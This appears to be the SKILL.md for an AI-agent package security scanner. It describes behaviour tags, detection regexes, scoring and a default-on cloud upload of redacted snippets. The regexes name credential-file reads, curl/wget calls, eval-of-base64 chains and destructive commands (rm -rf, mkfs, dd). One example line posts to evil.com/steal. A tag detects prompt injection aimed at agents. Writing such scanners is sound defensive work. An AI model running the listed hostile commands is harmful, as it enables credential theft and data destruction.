---
name: yidun-skill-sec
version: 1.0.1
description: Intelligent code security scanner with hybrid local-cloud detection. Fingerprints packages, runs static behavioral analysis, and consults cloud threat intelligence (enabled by default, can be disabled) for confidence scoring.
homepage: https://clawhub.com
metadata:
  openclaw:
    emoji: "⚡"
    requires:
      bins: ["curl", "jq", "openssl"]
    os:
      - linux
      - darwin
      - win32
    env:
      - name: YIDUN_SKILL_SEC_CLOUD
        description: "Enable or disable cloud threat intelligence. Default: true"
        required: false
        default: "true"
      - name: YIDUN_SKILL_SEC_TRUSTED_REGISTRIES
        description: "Comma-separated list of additional trusted registry hostnames"
        required: false
      - name: YIDUN_SKILL_SEC_LOG_PAYLOAD
        description: "Log the redacted payload locally before cloud upload for audit. Default: false"
        required: false
        default: "false"
---

# yidun-skill-sec ⚡

Hybrid local-cloud security scanner for third-party code packages. Scans fast, scores precisely, fails safely.

## Security Disclosure

### Data Transmission

This skill uploads only **non-sensitive metadata** to the NetEase Yidun threat intelligence endpoint for security analysis, including:

- File hash values
- Behavior tags
- Code snippets that triggered detections (redacted via the Local Redaction Pipeline)

The following data is **never uploaded**:

- Full source code
- User credentials or secret keys
- Environment variable values
- Any personal or private data

### Data Processing

- Cloud detection data is used **exclusively for the current security scan** and is **destroyed immediately** after analysis is complete. No data is persisted or stored on the server side.

### Cloud Service

- The cloud endpoint (`as.dun.163.com`) is operated by **NetEase Yidun**, a licensed cybersecurity service provider.
- Cloud analysis is **enabled by default**. It is strongly recommended to keep it enabled for optimal security protection. To disable, set `YIDUN_SKILL_SEC_CLOUD=false`.

## What It Does

yidun-skill-sec fingerprints a code package, runs behavioral analysis locally, and consults cloud threat intelligence to produce a quantified safety score. It catches malware, data leaks, privilege abuse, and obfuscation — before anything gets installed.

## How It Works — Four Phases

```
┌──────────────┐     ┌──────────────┐     ┌──────────────────┐     ┌────────────────┐
│   SOURCE     │────▶│  FINGERPRINT │────▶│  BEHAVIORAL SCAN │────▶│  CLOUD INTEL   │
│  VETTING     │     │  hash + meta │     │  static analysis │     │  (default: on) │
└──────────────┘     └──────────────┘     └──────────────────┘     └────────────────┘
        │                    │                     │                        │
        └────────────────────┴─────────────────────┴────────────────────────┘
                                                   ▼
                                         ┌───────────────────┐
                                         │  THREAT VERDICT   │
                                         │  score + labels   │
                                         └───────────────────┘
```

---

## Phase 0: Source Vetting

Before downloading or scanning any code, yidun-skill-sec evaluates **where the package comes from**. A package from an untrusted or unknown source carries inherent risk regardless of its content.

### 0.1 Source Tags

| Tag | What It Catches | Severity Boost |
|-----|----------------|----------------|
| `SRC_UNKNOWN_REGISTRY` | Package originates from an unrecognized or unofficial registry | +20 |
| `SRC_BLACKLISTED_DOMAIN` | Install URL or declared homepage matches a known malicious domain/IP | +40 |
| `SRC_UNTRUSTED_AUTHOR` | Publisher account is new (<30 days), unverified, or has prior malicious packages | +15 |

> **Hard Rule**: Any `SRC_BLACKLISTED_DOMAIN` hit forces the verdict to **CRITICAL** immediately — scanning halts and the package is blocked without further analysis.

### 0.1.1 Domain Blacklist Source

The domain blacklist used by `SRC_BLACKLISTED_DOMAIN` is maintained in two tiers:

| Tier | Source | Availability |
|------|--------|-------------|
| Local embedded list | Bundled with the skill, updated on each skill release | Always available (offline-safe) |
| Cloud-augmented list | Fetched from `as.dun.163.com` during Phase 3 | Only when `YIDUN_SKILL_SEC_CLOUD=true` |

In Phase 0, the scanner checks against the **local embedded list only**. When cloud is enabled, the full cloud-augmented blacklist is checked during Phase 3, and any additional domain hits are retroactively applied to the verdict.

### 0.2 Registry Allowlist

The following registries are considered trusted by default:

| Registry | Protocol |
|----------|---------|
| ClawHub (`clawhub.com`) | HTTPS + signed manifest |
| npm (`registry.npmjs.org`) | HTTPS |
| PyPI (`pypi.org`) | HTTPS |
| GitHub Releases (`github.com/*/releases`) | HTTPS |
| Custom allowlist via `YIDUN_SKILL_SEC_TRUSTED_REGISTRIES` | Configurable (registry only) |

Packages installed directly from a raw URL, a private server, or an unknown host are tagged `SRC_UNKNOWN_REGISTRY` unless the host is on the allowlist.

### 0.3 Author / Publisher Trust

For supported registries (npm, PyPI, ClawHub), the scanner checks the publishing account's trust profile:

| Signal | Penalizes When |
|--------|---------------|
| Account age | < 30 days old |
| Verification status | Unverified / no 2FA |
| Prior packages | Any previously removed for malware |
| Ownership match | Author field in package metadata ≠ registry profile name |

```bash
# Source vetting output example
SOURCE VETTING
  Registry: clawhub.com → ✅ trusted
  Domain:   clawhub.com → ✅ not blacklisted
  Author:   some-author (verified, age: 2y 3m) → ✅ trusted
  Source score: 100/100  Tags: none
```

### 0.4 Source Metadata in Cloud Request

Source vetting results are included in the cloud request as `source_meta`:

```json
"source_meta": {
  "registry": "clawhub.com",
  "install_url": "https://clawhub.com/packages/data-processor-1.2.3.tar.gz",
  "author_verified": true,
  "author_account_age_days": 823,
  "prior_removals": 0,
  "tags": []
}
```

---

## Phase 1: Fingerprint

Before anything else, build a complete inventory of the package.

**Actions performed:**
1. List every file in the package
2. Compute `SHA-256` hash per file via `openssl dgst -sha256`
3. Derive a composite package fingerprint (sorted hash of all file hashes)
4. Extract metadata: name, version, author, declared dependencies
**Output:** A fingerprint manifest used for cache lookups and audit trail.

```bash
# Example: compute file hashes
find /tmp/pkg -type f -exec openssl dgst -sha256 {} \;

# Example: composite fingerprint
find /tmp/pkg -type f -exec openssl dgst -sha256 {} \; | sort | openssl dgst -sha256
```

> **Note on nested archives**: If the package contains compressed or archive files (`.zip`, `.tar.gz`, `.whl`, `.jar`, `.rar`, `.7z`, etc.), the scanner **does NOT extract them**. The presence of archives that require decompression and command execution is considered an inherent security risk. The archive file itself is fingerprinted, and the package is immediately tagged `ARCHIVE_EXEC_RISK` with a severity boost of **+30**. If the archive is also password-protected or otherwise opaque, the tag `OBFUSCATED` is additionally applied.

---

## Phase 2: Behavioral Scan

A static analysis pass that classifies every file by its **observable behaviors**. No code is executed — only pattern matching and structural inspection.

### 2.1 Behavior Categories

Each detected behavior is tagged into one of these categories:

| Tag | What It Catches | Severity Boost |
|-----|----------------|----------------|
| `NET_OUTBOUND` | HTTP/HTTPS calls, socket connections, DNS lookups | +15 |
| `NET_IP_RAW` | Connections to raw IPs instead of hostnames | +25 |
| `FS_READ_SENSITIVE` | Reads from `~/.ssh`, `~/.gnupg`, `~/.aws`, `~/.config/gh` | +30 |
| `FS_WRITE_SYSTEM` | Writes outside the project workspace | +20 |
| `EXEC_DYNAMIC` | `eval()`, `exec()`, `Function()`, backtick interpolation | +25 |
| `EXEC_SHELL` | Spawns shell subprocesses | +10 |
| `ENCODE_DECODE` | Base64/hex encode-decode chains (potential obfuscation) | +20 |
| `CRED_HARVEST` | Reads tokens, passwords, API keys from env or files | +35 |
| `PRIV_ESCALATION` | `sudo`, `chmod 777`, `setuid` patterns | +30 |
| `OBFUSCATED` | Minified/packed code, non-readable variable names | +15 |
| `AGENT_MEMORY` | Accesses agent memory files (identity, preferences, context) | +25 |
| `PKG_INSTALL` | Installs unlisted system packages or dependencies | +20 |
| `COOKIE_SESSION` | Reads browser cookies, localStorage, session tokens | +25 |
| `BYPASS_SAFETY` | Uses flags that skip security checks: `--no-verify`, `--force`, `--allow-root`, `--skip-ssl` | +20 |
| `DESTRUCTIVE_OP` | Irreversible destructive operations: `rm -rf`, `git reset --hard`, `DROP TABLE`, `mkfs`, `dd if=` | +25 |
| `PROMPT_INJECT` | Embeds natural language directives targeting the AI agent, attempting to override its rules, bypass constraints, or assume an unrestricted persona | +35 |
| `ARCHIVE_EXEC_RISK` | Package contains compressed/archive files (`.zip`, `.tar.gz`, `.whl`, `.jar`, `.rar`, `.7z`) that require decompression — treated as inherent risk, not extracted | +30 |

### 2.2 Example Context Exemption

Before scoring, the scanner identifies whether a pattern match falls within a **documentation or example context**. Matches in example contexts receive a **severity reduction** (not full immunity) because example code can still be copy-pasted and executed.

#### 2.2.1 What Qualifies as Example Context

| Context Type | Detection Method | Example |
|-------------|-----------------|---------|
| Markdown fenced code block | Match is inside `` ``` `` or `` ~~~ `` fenced blocks in `.md` / `.mdx` / `.rst` files | ````curl -X POST https://evil.com/steal```` in a SKILL.md tutorial |
| Inline code span | Match is inside single backticks in documentation files | \`eval(user_input)\` in a README |
| Code comments | Match is on a line starting with `#`, `//`, `/* */`, `<!-- -->`, or language-specific comment markers | `# Example: sudo chmod 777 /tmp` |
| Clearly labeled example sections | Match is under a heading containing keywords: `example`, `demo`, `tutorial`, `sample`, `usage`, `how-to` | Section titled "## Usage Example" |
| Non-executable file types | Match is in `.md`, `.txt`, `.rst`, `.adoc`, `.html` (non-script) files | A `.md` file describing attack patterns |

#### 2.2.2 Exemption Rules

| Rule | Effect |
|------|--------|
| **Severity reduction** | Tags matched in example context have their severity boost **reduced by 75%** (rounded down). E.g. `CRED_HARVEST` (+35) → (+8) in example context |
| **Hard rule exemption** | Tags matched **exclusively** in example contexts do **not** trigger hard rules (SEVERE/CRITICAL floor). If the same tag also appears in non-example code, the hard rule still applies |
| **Cross-file correlation exemption** | Example-context matches are **excluded** from cross-file correlation patterns |
| **Minimum residual** | Even after reduction, each example-context tag retains a **minimum +3 severity boost** — examples are never fully invisible |
| **Report annotation** | Example-context matches are annotated with `[EXAMPLE]` in the scan report to distinguish them from real threats |

#### 2.2.3 What Does NOT Qualify for Exemption

The following are **never exempted**, regardless of context:

| Condition | Reason |
|-----------|--------|
| Pattern in `.sh`, `.py`, `.js`, `.ts`, or other executable file types | Script files can be executed directly, even if they contain "example" comments |
| `install` / `postinstall` / `setup` lifecycle scripts | These run automatically — example or not, they execute |
| `PROMPT_INJECT` tag | Prompt injection works by being read as text — Markdown is the attack surface, not an innocent context |
| Pattern in a file that is referenced by an executable entry point (e.g. imported or sourced) | If a `.md` is parsed at runtime, it's not just documentation |

#### 2.2.4 Example Context in Reports

When example exemption is applied, the report shows both the original and reduced deduction:

```
Phase 2 · Behavioral Scan
  CRED_HARVEST   SKILL.md:255  -8   [EXAMPLE] (original: -35, in markdown code block)
  NET_OUTBOUND   SKILL.md:255  -3   [EXAMPLE] (original: -15, in markdown code block)
  EXEC_DYNAMIC   SKILL.md:262  -6   [EXAMPLE] (original: -25, in markdown code block)
  NET_OUTBOUND   fetch.py:12   -15  ← real code, no exemption
  Local score: 65/100
```

> **Design rationale**: Documentation files with security examples (e.g. a skill's own SKILL.md showing attack patterns for educational purposes) should not be penalized at the same severity as actual malicious code. However, they retain a small residual score because: (1) examples can be copied and run, (2) a package filled with nothing but "examples" of attacks is itself suspicious, and (3) PROMPT_INJECT is never exempt because the documentation IS the attack vector for prompt injection.

### 2.3 How Severity Scores Work

- Start at **100** (fully safe)
- Each behavior tag **subtracts** its severity boost from the score (after applying Example Context Exemption if applicable)
- Multiple tags stack, but the score floors at **0**
- A single `CRED_HARVEST` or `PRIV_ESCALATION` tag **in non-example context** triggers an **immediate escalation** — the package is flagged regardless of total score

### 2.4 Pattern Matching Rules

The scanner matches against concrete code patterns:

```
NET_OUTBOUND:
  curl|wget|fetch|http\.get|requests\.(get|post)|axios|urllib
  + destination is NOT localhost/127.0.0.1/::1

NET_IP_RAW:
  \b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\b in URL/connection context

FS_READ_SENSITIVE:
  cat|read|open.*\.(ssh|gnupg|aws|config/gh|kube)

EXEC_DYNAMIC:
  dynamic execution calls (eval, exec, new Function, backtick interpolation)
  with non-literal or externally-sourced arguments

ENCODE_DECODE:
  base64\s+(encode|decode|-d)|atob\(|btoa\(|Buffer\.from\(.*base64

CRED_HARVEST:
  (API_KEY|SECRET_KEY|TOKEN|PASSWD|PRIV_KEY) followed by assignment|
  cat/read operations targeting private key files or dotenv files|
  keyring access patterns

PRIV_ESCALATION:
  sudo invocations|chmod with world-writable bits|chown to root|setuid patterns

AGENT_MEMORY:
  MEMORY\.md|USER\.md|SOUL\.md|IDENTITY\.md|\.claude|\.claw/memory

OBFUSCATED:
  single-line file >500 chars with no whitespace|
  variable names all <3 chars in >20 occurrences

BYPASS_SAFETY:
  --no-verify|--force|--allow-root|--skip-ssl|--insecure|--no-check-certificate|
  GIT_SSL_NO_VERIFY|NODE_TLS_REJECT_UNAUTHORIZED=0

DESTRUCTIVE_OP:
  rm\s+-rf|shutil\.rmtree|git\s+reset\s+--hard|git\s+clean\s+-fd|
  DROP\s+TABLE|DROP\s+DATABASE|mkfs\.|dd\s+if=|truncate\s+--size=0

PROMPT_INJECT:
  Patterns that attempt to override agent instructions or assume unrestricted personas.
  Exact regex strings are maintained server-side to prevent the pattern list itself
  from being flagged as an injection vector. The local scanner checks for structural
  indicators (e.g. imperative overrides targeting "instructions", "rules", "constraints",
  jailbreak persona triggers, and SYSTEM-level injection markers in non-system contexts).
```

---

## Phase 3: Cloud Intelligence

When cloud is enabled (default), yidun-skill-sec consults the remote threat intelligence service. If the user has set `YIDUN_SKILL_SEC_CLOUD=false`, this phase is skipped entirely and scoring uses offline weights. If the cloud call times out (10s), the scanner automatically downgrades to local-only mode and notifies the user.

### 3.1 What Gets Sent

The fingerprint manifest, behavior tags, and **redacted evidence artifacts** are uploaded. All evidence **must pass through the Local Redaction Pipeline before any network call is made**.

### 3.2 Local Redaction Pipeline

Before uploading evidence to the cloud, the scanner runs every evidence record through the following mandatory redaction steps **in order**. No raw evidence leaves the local machine.

```
┌─────────────┐     ┌─────────────┐     ┌─────────────┐     ┌─────────────┐     ┌──────────┐
│  Raw match  │────▶│  Step 1     │────▶│  Step 2     │────▶│  Step 3     │────▶│  Step 4  │
│  from scan  │     │  Credential │     │  Path       │     │  Content    │     │  Length  │
│             │     │  Scrub      │     │  Normalize  │     │  Truncate   │     │  Cap     │
└─────────────┘     └─────────────┘     └─────────────┘     └─────────────┘     └──────────┘
                                                                                      │
                                                                                      ▼
                                                                              Redacted evidence
                                                                              ready for upload
```

**Step 1 — Credential Scrub**

Replace all secret values with `[REDACTED]`. Only the **variable name** or **access pattern** is preserved.

| Pattern | Before | After |
|---------|--------|-------|
| Env variable values | `os.environ.get('KEY') → "sk-abc123..."` | `os.environ.get('KEY') → [REDACTED]` |
| Inline secrets | `api_key = "sk-abc123def456"` | `api_key = [REDACTED]` |
| Auth headers | `Authorization: Bearer eyJ...` | `Authorization: Bearer [REDACTED]` |
| Connection strings | `postgres://user:pass@host/db` | `postgres://[REDACTED]@host/db` |

Regex for scrubbing:
```
(=|:|Bearer\s+|://[^@]+@)\s*["']?[A-Za-z0-9_\-\.]{8,}["']?
→ replace matched value portion with [REDACTED]
```

**Step 2 — Path Normalize**

Sensitive file paths are reduced to **pattern only** — the actual file content is never read or sent.

| Before | After |
|--------|-------|
| `/Users/john/.ssh/id_rsa` | `~/.ssh/<PRIVATE_KEY>` |
| `/home/dev/.aws/credentials` | `~/.aws/<CREDENTIALS>` |
| `/Users/john/.env` | `~/<DOTENV>` |
| `/Users/john/.config/gh/hosts.yml` | `~/.config/gh/<CONFIG>` |

Rule: Any path under `~/` containing `.ssh`, `.aws`, `.gnupg`, `.env`, `.config/gh`, `.kube` → normalize username to `~`, replace filename with `<TYPE_TAG>`.

**Step 3 — Content Truncate**

The `context` field (matched code line) is limited to **a single line, max 200 characters**. No surrounding lines are collected.

| Rule | Action |
|------|--------|
| Multi-line match | Keep only the first line |
| Line > 200 chars | Truncate at 200, append `…[TRUNCATED]` |
| Binary content detected | Replace entire context with `[BINARY DATA]` |

**Step 4 — Length Cap**

Each evidence array (`urls`, `commands`, `credential_accesses`, `obfuscation_samples`) is capped at **10 items**. If more matches exist, only the top 10 by severity are sent, and a `"truncated": true` flag is added.

### 3.3 Redaction Guarantee

The following data **never leaves the local machine** under any circumstances:

| Category | Guaranteed NOT sent |
|----------|-------------------|
| Source code | Full file contents — only the single matched line (redacted) is sent |
| Secret values | API keys, tokens, passwords, private keys — replaced with `[REDACTED]` |
| Env variable values | Only the variable name is sent, never the value |
| Sensitive file content | Files under `~/.ssh`, `~/.aws`, `~/.env` etc. — only the normalized path pattern |
| Personal identifiers | Usernames in paths are normalized to `~` |
| Binary data | Replaced with `[BINARY DATA]` placeholder |

> **Audit point:** The redacted payload can be logged locally before upload by setting `YIDUN_SKILL_SEC_LOG_PAYLOAD=true`. This allows users to verify exactly what leaves the machine.

```http
POST https://as.dun.163.com/v1/agent-sec/skill/check

{
  "request_id": "f47ac10b-58cc-4372-a567-0e02b2c3d479",
  "skill": {
    "name": "target-package",
    "version": "1.2.3",
    "source": "clawhub",
    "author": "some-author"
  },
  "files": [
    {"path": "main.py", "sha256": "a1b2c3...", "size": 4096},
    {"path": "config.yml", "sha256": "d4e5f6...", "size": 256}
  ],
  "skill_sha256": "composite_fingerprint_abc",
  "local_result": {
    "red_flags": ["NET_OUTBOUND", "ENCODE_DECODE"],
    "risk_level": "medium"
  },
  "evidence": {
    "urls": [
      {
        "tag": "NET_OUTBOUND",
        "value": "https://<EXAMPLE_HOST>/api/data",
        "file": "fetch.py",
        "line": 12,
        "context": "requests.post('https://<EXAMPLE_HOST>/api/data', data=payload)"
      },
      {
        "tag": "NET_IP_RAW",
        "value": "http://<RAW_IP>/endpoint",
        "file": "init.py",
        "line": 7,
        "context": "urllib.request.urlopen('http://<RAW_IP>/endpoint')"
      }
    ],
    "commands": [
      {
        "tag": "EXEC_SHELL",
        "value": "<SHELL_CMD>",
        "file": "setup.sh",
        "line": 23,
        "context": "subprocess.run([<SHELL_CMD>], shell=True)"
      },
      {
        "tag": "EXEC_DYNAMIC",
        "value": "<DYNAMIC_EVAL_CALL>",
        "file": "loader.py",
        "line": 5,
        "context": "<DYNAMIC_EVAL_CALL>"
      },
      {
        "tag": "PRIV_ESCALATION",
        "value": "<PRIV_CMD>",
        "file": "install.sh",
        "line": 11,
        "context": "os.system('<PRIV_CMD>')"
      }
    ],
    "credential_accesses": [
      {
        "tag": "CRED_HARVEST",
        "value": "os.environ.get('<SENSITIVE_KEY_NAME>')",
        "file": "config.py",
        "line": 3,
        "context": "secret = os.environ.get('<SENSITIVE_KEY_NAME>')"
      },
      {
        "tag": "FS_READ_SENSITIVE",
        "value": "~/.ssh/<KEY_FILE>",
        "file": "auth.py",
        "line": 18,
        "context": "open(os.path.expanduser('~/.ssh/<KEY_FILE>')).read()"
      }
    ],
    "obfuscation_samples": [
      {
        "tag": "ENCODE_DECODE",
        "value": "base64.b64decode('<ENCODED_STRING>')",
        "file": "payload.py",
        "line": 9,
        "context": "<DYNAMIC_EVAL>(base64.b64decode('<ENCODED_STRING>').decode())"
      }
    ]
  }
}
```

#### Evidence Field Specification

| Field | Type | Description |
|-------|------|-------------|
| `evidence.urls` | array | Full URLs that triggered `NET_OUTBOUND` / `NET_IP_RAW` tags |
| `evidence.commands` | array | Command snippets that triggered `EXEC_SHELL` / `EXEC_DYNAMIC` / `PRIV_ESCALATION` tags |
| `evidence.credential_accesses` | array | Credential access expressions or paths that triggered `CRED_HARVEST` / `FS_READ_SENSITIVE` tags |
| `evidence.obfuscation_samples` | array | Encoding call snippets that triggered `ENCODE_DECODE` / `OBFUSCATED` tags |
| `evidence.system_operations` | array | System-level actions that triggered `FS_WRITE_SYSTEM` / `PKG_INSTALL` / `DESTRUCTIVE_OP` / `BYPASS_SAFETY` tags |
| `evidence.agent_security` | array | Agent-targeting behaviors that triggered `AGENT_MEMORY` / `COOKIE_SESSION` / `PROMPT_INJECT` tags |

Each evidence record has the following structure:

| Sub-field | Description |
|-----------|-------------|
| `tag` | The behavior tag that was triggered |
| `value` | Redacted extracted value (URL / command / path), post Local Redaction Pipeline |
| `file` | Source file path where the pattern was found |
| `line` | Line number of the match |
| `context` | Full content of the matched line (single line only, no surrounding context) |

### 3.4 What Happens Server-Side

```
Request received
  │
  ├─ Lookup fingerprint in threat database
  │   ├── Known malicious  → immediate BLOCK
  │   ├── Known safe       → immediate PASS
  │   └── Unknown          → run deep analysis via content safety API
  │                            ├── analyze code snippets (sanitized)
  │                            ├── check against threat patterns
  │                            └── cache result with TTL
  │
  └─ Return verdict + confidence score
```

### 3.5 Response Format

```json
{
  "request_id": "f47ac10b-58cc-4372-a567-0e02b2c3d479",
  "cache_hit": false,
  "confidence_score": 45,
  "labels": ["NET_OUTBOUND", "ENCODE_DECODE", "NET_IP_RAW"],
  "verdict": "REVIEW",
  "recommendation": "Suspicious encoding patterns detected near network calls",
  "deductions": [
    {
      "tag": "NET_OUTBOUND",
      "reason": "Detected outbound HTTP call to unknown external host",
      "evidence": "https://<EXAMPLE_HOST>/api/data",
      "score_impact": -15,
      "severity": "medium"
    },
    {
      "tag": "ENCODE_DECODE",
      "reason": "Base64 decode result passed directly into dynamic execution — likely obfuscated payload",
      "evidence": "<DYNAMIC_EVAL>(base64.b64decode('<ENCODED_STRING>').decode())",
      "score_impact": -20,
      "severity": "high"
    },
    {
      "tag": "NET_IP_RAW",
      "reason": "Connection to raw IP address bypasses DNS — common in C2 communication",
      "evidence": "http://<RAW_IP>/endpoint",
      "score_impact": -25,
      "severity": "high"
    }
  ]
}
```

| Field | Type | Meaning |
|-------|------|---------|
| `request_id` | string | UUID v4 echoed from the request — use for tracing and audit logs |
| `cache_hit` | bool | Was the fingerprint already in the database? |
| `confidence_score` | int | 0–100, higher means safer |
| `labels` | string[] | Detected threat categories |
| `verdict` | enum | `PASS` / `REVIEW` / `BLOCK` |
| `recommendation` | string | Human-readable summary of the verdict |
| `deductions` | array | Per-tag score deduction breakdown from cloud analysis |

> **`request_id` generation**: Client must generate a UUID v4 before each request and include it in the body. The server echoes the same value in the response for end-to-end tracing.
>
> ```bash
> # Generate UUID v4 on the fly (macOS / Linux)
> REQUEST_ID=$(uuidgen | tr '[:upper:]' '[:lower:]')
> ```

**`deductions` item fields:**

| Sub-field | Type | Meaning |
|-----------|------|---------|
| `tag` | string | Behavior tag that triggered this deduction |
| `reason` | string | Cloud analysis explanation for why this tag was penalized |
| `evidence` | string | The specific URL / command / snippet that was matched |
| `score_impact` | int | Points deducted from `confidence_score` for this tag |
| `severity` | enum | `low` / `medium` / `high` / `critical` |

### 3.6 Timeout Fallback

When cloud is enabled but the network call fails:

1. `curl` times out after **10 seconds**
2. Scanner falls back to local-only mode automatically
3. All scores shift **-10 points** (conservative bias)
4. Report shows `Mode: local-only (cloud timeout)`
5. Any score below 60 requires user confirmation before install

---

## Producing the Verdict

The final threat score combines local scan + cloud intel (when available):

### Score Composition

| Signal | Normal Weight | Offline Weight |
|--------|:------------:|:--------------:|
| Source vetting score | 15% | 20% |
| Behavioral scan score | 40% | 55% |
| Cloud confidence score | 30% | — |
| Privilege surface area | 15% | 25% |

#### Privilege Surface Area Score

The privilege surface area score starts at **100** and is deducted based on the breadth of privileged access the package requests:

| Surface | Deduction | Condition |
|---------|:---------:|-----------|
| Network | -20 | Any `NET_OUTBOUND` or `NET_IP_RAW` tag present |
| Filesystem | -20 | Any `FS_READ_SENSITIVE` or `FS_WRITE_SYSTEM` tag present |
| Shell | -20 | Any `EXEC_SHELL` or `EXEC_DYNAMIC` tag present |
| Credentials | -25 | Any `CRED_HARVEST` tag present |
| System | -15 | Any `PRIV_ESCALATION`, `PKG_INSTALL`, or `DESTRUCTIVE_OP` tag present |

The score floors at **0**. A package that touches all surfaces scores 0; a package with no privileged access scores 100.

### Threat Levels

| Score | Level | Action |
|-------|-------|--------|
| 80–100 | 🟢 **CLEAR** | Install normally |
| 60–79 | 🟢 **MINOR** | Install with awareness |
| 40–59 | 🟡 **ELEVATED** | User review before install |
| 20–39 | 🔴 **SEVERE** | Requires explicit user consent |
| 0–19 | ⛔ **CRITICAL** | Blocked — do not install |

**Hard rules (override score):**

> "Floor to X" means the verdict **cannot be better than X**. If the natural score already falls into a worse level, that worse level applies.

- Any `CRED_HARVEST` tag → floor to SEVERE (score capped at 39)
- Any `PRIV_ESCALATION` tag → floor to SEVERE (score capped at 39)
- Any `PROMPT_INJECT` tag → floor to SEVERE (score capped at 39)
- Any `DESTRUCTIVE_OP` tag → floor to ELEVATED (score capped at 59)
- `CRED_HARVEST` + `PRIV_ESCALATION` both present → force CRITICAL (score capped at 19)
- `PROMPT_INJECT` + any of (`CRED_HARVEST`, `NET_OUTBOUND`, `EXEC_DYNAMIC`) → force CRITICAL (score capped at 19)

---

## Report Output

### ⚡ YIDUN-SKILL-SEC Scan Report

> `[name]` · v`[version]` · `[source]` · by `[author]` · `[timestamp]`

**Phase 0 · Source Vetting**
| | Result |
|--|--------|
| Registry | [name] → ✅ trusted / ⚠️ unknown / N/A |
| Domain | [host] → ✅ clean / ❌ blacklisted |
| Author | [name] → ✅ verified / ⚠️ unverified |
| **Source Score** | **[xx]/100** · Tags: `[tags or none]` |

**Phase 1 · Fingerprint**
> `[N]` files · SHA-256 `[hash...]` · `[file1] [file2] ...`

**Phase 2 · Behavioral Scan**
| Tag | Location | Deduction |
|-----|----------|:---------:|
| `[TAG_1]` | [file:line] | **-[N]** |
| `[TAG_2]` | [file:line] | **-[N]** |

> Local score **[xx]/100** · If no findings: ✅ No suspicious behaviors detected

**Phase 3 · Cloud Intel**
| | Result |
|--|--------|
| Mode | [cloud / local-only / mock] |
| Cache | [hit safe / hit threat / miss] |
| **Cloud Score** | **[xx]/100** · Labels: `[list or none]` |

**Privilege Surface** · Network: `[domains]` · FS: `[paths]` · Shell: `[cmds]` · Creds: `[yes/no]`

---

> ### 🎯 Score: **[xx]/100** · [🟢 CLEAR / 🟢 MINOR / 🟡 ELEVATED / 🔴 SEVERE / ⛔ CRITICAL]
> **[✅ Allow / ⚠️ Requires confirmation / ❌ Blocked]**
>
> ⚠️ [hard rule trigger or key observation, omit if none]

---

## Usage Example

**User**: "Install data-processor from ClawHub"

**Agent workflow**:
```
0. Source vetting
   → Registry: clawhub.com ✅  Domain: clean ✅  Author: verified ✅
   → Source score: 100/100

1. Download to temp directory
   $ mkdir -p /tmp/yds-scan && clawhub install data-processor --dir /tmp/yds-scan

2. Fingerprint
   $ find /tmp/yds-scan -type f -exec openssl dgst -sha256 {} \;
   → 4 files, composite: 7f3a...

3. Behavioral scan
   → NET_OUTBOUND detected in fetch.py:12 (api.dataproc.io)
   → FS_WRITE_SYSTEM detected in setup.sh:8 (/usr/local/bin)
   → EXEC_SHELL detected in setup.sh:15 (subprocess.run)
   → Local score: 100 - 15 - 20 - 10 = 55/100

4. Privilege surface area
   → Network: -20, Filesystem: -20, Shell: -20 → 100 - 20 - 20 - 20 = 40/100

5. Cloud intel query
   → Cache miss → deep analysis → confidence 48/100
   → Labels: [NET_OUTBOUND, FS_WRITE_SYSTEM, EXEC_SHELL]

6. Final score: 15% × 100 + 40% × 55 + 30% × 48 + 15% × 40 = 15 + 22 + 14.4 + 6 = 57.4 ≈ 57
   → Level: ELEVATED
   → Verdict: ⚠️ Review — network calls + system writes + shell exec need justification
```

---

## More Scenarios

### Clean Package
```
Package: markdown-helper v2.1.0
Behaviors: none detected
Cloud: cache hit (safe), score 92
Final: 🟢 CLEAR (94) → ✅ Allow
```

### Obfuscation + Credential Access
```
Package: perf-booster v1.0.0
Behaviors: OBFUSCATED, CRED_HARVEST, NET_OUTBOUND
Cloud: cache hit (threat), score 5
Hard rule: CRED_HARVEST → floor SEVERE (cap 39)
Natural score: 8 → already worse than SEVERE → stays CRITICAL
Final: ⛔ CRITICAL (8) → ❌ Block
```

### Offline Scan
```
Package: log-rotator v3.0.0
Behaviors: FS_WRITE_SYSTEM, EXEC_SHELL
Cloud: unavailable → local-only mode (-10 penalty)
Local score: 60 - 10 = 50
Final: 🟡 ELEVATED (50) → ⚠️ Review
```

---

## Cross-File Behavior Correlation

In addition to per-file pattern matching, the scanner performs **cross-file correlation** to detect multi-stage attack patterns that only become apparent when viewed holistically:

| Correlation Pattern | Tags Involved | Severity Boost |
|-------------------|---------------|:--------------:|
| Credential read in file A + network send in file B | `CRED_HARVEST` + `NET_OUTBOUND` | +15 (additive) |
| Decode in file A + dynamic exec in file B | `ENCODE_DECODE` + `EXEC_DYNAMIC` | +10 (additive) |
| Sensitive file read + encode + network send (any files) | `FS_READ_SENSITIVE` + `ENCODE_DECODE` + `NET_OUTBOUND` | +20 (additive) |
| Prompt inject + agent memory access (any files) | `PROMPT_INJECT` + `AGENT_MEMORY` | +15 (additive) |

> **Note**: Correlation boosts are applied **after** individual tag deductions. They stack with existing severity scores and are included as separate entries in the scan report.

---

## Scan Caching

To avoid redundant work, the scanner maintains a **local fingerprint cache**:

| Parameter | Value |
|-----------|-------|
| Cache location | `~/.yidun-skill-sec/cache.json` |
| Cache key | Composite SHA-256 fingerprint |
| TTL | 24 hours |
| Invalidation | Any file change → new fingerprint → cache miss |
| Version change | Package version bump → always re-scan |
| Force re-scan | Pass `--no-cache` flag or delete cache file |

When a cache hit occurs:
1. The cached verdict is returned immediately
2. Report shows `Cache: local hit` with the original scan timestamp
3. If the cache entry is > 12 hours old, the report appends a note: `⚠️ Cache aging — consider re-scan`

> **Cloud-side caching** is managed by the server with its own TTL. A local cache hit skips the cloud call entirely.

---

## Cloud Call Policy

Cloud intelligence is **enabled by default**. The user can explicitly disable it by setting:

```bash
export YIDUN_SKILL_SEC_CLOUD=false
```

When disabled, the scanner runs in local-only mode with adjusted score weights and notifies the user that cloud verification was skipped.

| Mode | Trigger | Behavior |
|------|---------|---------|
| Cloud ON | Default / `YIDUN_SKILL_SEC_CLOUD=true` | Full 4-phase scan, domain blacklist checked server-side |
| Cloud OFF | `YIDUN_SKILL_SEC_CLOUD=false` | Local-only scan, domain blacklist skipped, score weights adjusted |
| Timeout fallback | Cloud ON but `curl` times out (10s) | Automatic downgrade to local-only, -10 score penalty, user notified |

**Rules that always apply regardless of mode:**
- ❌ Do NOT self-judge that cloud is "unnecessary" and skip it without the user setting `YIDUN_SKILL_SEC_CLOUD=false`
